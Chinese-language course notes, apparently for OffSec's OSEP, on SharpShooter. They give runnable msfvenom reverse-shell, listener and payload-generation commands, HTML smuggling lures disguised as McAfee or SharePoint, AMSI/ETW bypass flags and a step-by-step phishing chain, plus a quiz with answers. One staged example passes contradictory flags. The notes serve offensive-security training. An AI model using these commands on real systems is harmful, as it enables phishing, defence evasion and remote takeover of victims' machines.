---
title: OSEP-04-SharpShooter工具
description: '04-JScript攻击 | 06-SharpShooter工具'
pubDate: 2026-01-30T00:00:33+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Module 4: Windows Script Host 攻击

## 第五节：SharpShooter 自动化工具

### 什么是 SharpShooter？

SharpShooter 是一个 payload 生成框架，可以自动化我们在本模块中学习的技术：

- 自动生成 DotNetToJscript payload
- 支持多种输出格式（Jscript、VBScript、HTA 等）
- 内置多种绕过技术
- 支持 staged 和 stageless payload

---

## 一、安装 SharpShooter

### 1.1 在 Kali 上安装

```bash
# 克隆仓库
cd /opt
sudo git clone https://github.com/mdsecactivebreach/SharpShooter.git

# 安装依赖
cd SharpShooter
sudo pip install -r requirements.txt

# 如果 pip 不存在
sudo apt install python-pip
```

### 1.2 验证安装

```bash
python SharpShooter.py --help
```

---

## 二、基本用法

### 2.1 生成 Stageless Jscript Payload

```bash
# 1. 首先生成 shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f raw \
    -o /var/www/html/shell.bin

# 2. 使用 SharpShooter 生成 Jscript
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --output test

# 输出: output/test.js
```

### 2.2 参数说明

| 参数 | 说明 |
|------|------|
| `--payload` | 输出格式：js, vbs, hta, macro |
| `--dotnetver` | .NET 版本：2, 4 |
| `--stageless` | 完整 payload 嵌入文件 |
| `--staged` | 分阶段加载 |
| `--rawscfile` | shellcode 文件路径 |
| `--output` | 输出文件名（不含扩展名） |

---

## 三、不同输出格式

### 3.1 Jscript (.js)

```bash
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --output payload_js
```

### 3.2 VBScript (.vbs)

```bash
python SharpShooter.py \
    --payload vbs \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --output payload_vbs
```

### 3.3 HTA (.hta)

```bash
python SharpShooter.py \
    --payload hta \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --output payload_hta
```

### 3.4 Office 宏

```bash
python SharpShooter.py \
    --payload macro \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --output payload_macro
```

---

## 四、Staged Payload

### 4.1 什么是 Staged Payload？

```
Stageless:
┌─────────────────────────────────┐
│  Jscript 文件                   │
│  ┌───────────────────────────┐  │
│  │ 完整 shellcode (嵌入)     │  │
│  └───────────────────────────┘  │
└─────────────────────────────────┘
        文件较大，但独立运行

Staged:
┌─────────────────────────────────┐
│  Jscript 文件                   │
│  ┌───────────────────────────┐  │
│  │ 下载器代码                │  │
│  └───────────────────────────┘  │
└─────────────────────────────────┘
        │
        │ 运行时下载
        ▼
┌─────────────────────────────────┐
│  远程服务器                     │
│  ┌───────────────────────────┐  │
│  │ 完整 shellcode            │  │
│  └───────────────────────────┘  │
└─────────────────────────────────┘
        文件较小，需要网络连接
```

### 4.2 生成 Staged Payload

```bash
# 生成 staged Jscript
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --staged \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --output staged_payload

# 注意：staged 模式会生成两个文件
# 1. staged_payload.js - 下载器
# 2. staged_payload.payload - 实际 payload
```

---

## 五、HTML Smuggling 集成

### 5.1 生成带 HTML Smuggling 的 Payload

```bash
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --smuggle \
    --template mcafee \
    --output smuggled

# 输出:
# - smuggled.js (Jscript payload)
# - smuggled.html (HTML smuggling 页面)
```

### 5.2 可用模板

| 模板 | 说明 |
|------|------|
| `mcafee` | 伪装成 McAfee 更新 |
| `sharepoint` | 伪装成 SharePoint 文档 |
| `generic` | 通用模板 |

---

## 六、绕过技术

### 6.1 AMSI 绕过

```bash
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --amsi amsienable \
    --output amsi_bypass

# AMSI 绕过选项:
# amsienable - 禁用 AMSI
# amsicontext - 破坏 AMSI 上下文
```

### 6.2 ETW 绕过

```bash
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /var/www/html/shell.bin \
    --etw \
    --output etw_bypass
```

---

## 七、完整攻击流程

### 7.1 准备阶段

```bash
# 1. 生成 shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 \
    LPORT=443 \
    -f raw \
    -o /tmp/shell.bin

# 2. 生成 payload
cd /opt/SharpShooter
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile /tmp/shell.bin \
    --smuggle \
    --template sharepoint \
    --output attack

# 3. 部署到 Web 服务器
sudo cp output/attack.html /var/www/html/document.html
sudo systemctl start apache2

# 4. 启动监听器
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.1.100; set LPORT 443; run"
```

### 7.2 攻击阶段

1. 发送钓鱼邮件，包含链接：`http://192.168.1.100/document.html`
2. 受害者访问链接
3. HTML Smuggling 自动下载 `.js` 文件
4. 受害者双击执行
5. 获得 Meterpreter shell

---

## 八、与其他工具对比

| 特性 | SharpShooter | DotNetToJscript | msfvenom |
|------|--------------|-----------------|----------|
| 自动化程度 | 高 | 中 | 低 |
| 输出格式 | 多种 | 多种 | 多种 |
| HTML Smuggling | 内置 | 需手动 | 不支持 |
| AMSI 绕过 | 内置 | 需手动 | 不支持 |
| 学习曲线 | 低 | 中 | 低 |
| 定制性 | 中 | 高 | 高 |

---

## 九、注意事项

### 9.1 检测风险

- SharpShooter 生成的 payload 可能被杀软识别
- 建议结合混淆技术使用
- 定期更新工具以获取最新绕过技术

### 9.2 最佳实践

1. **测试环境**：先在测试环境验证 payload
2. **定制化**：根据目标环境调整参数
3. **理解原理**：不要只依赖工具，理解底层技术
4. **备用方案**：准备多种 payload 格式

---

## 十、章节测试

### 选择题

1. SharpShooter 的 `--stageless` 参数表示什么？
   - A) 分阶段加载
   - B) 完整 payload 嵌入文件
   - C) 使用 HTTPS
   - D) 启用加密

2. 以下哪个不是 SharpShooter 支持的输出格式？
   - A) js
   - B) vbs
   - C) exe
   - D) hta

3. `--smuggle` 参数的作用是什么？
   - A) 加密 payload
   - B) 生成 HTML Smuggling 页面
   - C) 压缩 payload
   - D) 混淆代码

4. SharpShooter 的 shellcode 输入格式应该是？
   - A) csharp
   - B) raw
   - C) exe
   - D) base64

5. `--amsi amsienable` 的作用是什么？
   - A) 启用 AMSI
   - B) 禁用 AMSI
   - C) 检测 AMSI
   - D) 更新 AMSI

### 实践题

1. 使用 SharpShooter 生成一个 Jscript payload。

2. 生成带 HTML Smuggling 的 payload 并测试。

### 答案

**选择题**：1-B, 2-C, 3-B, 4-B, 5-B

---

**下一节**：[07-章节测试.md](/blog/osep/04-jscript攻击/07-章节测试/) - Module 4 综合测试
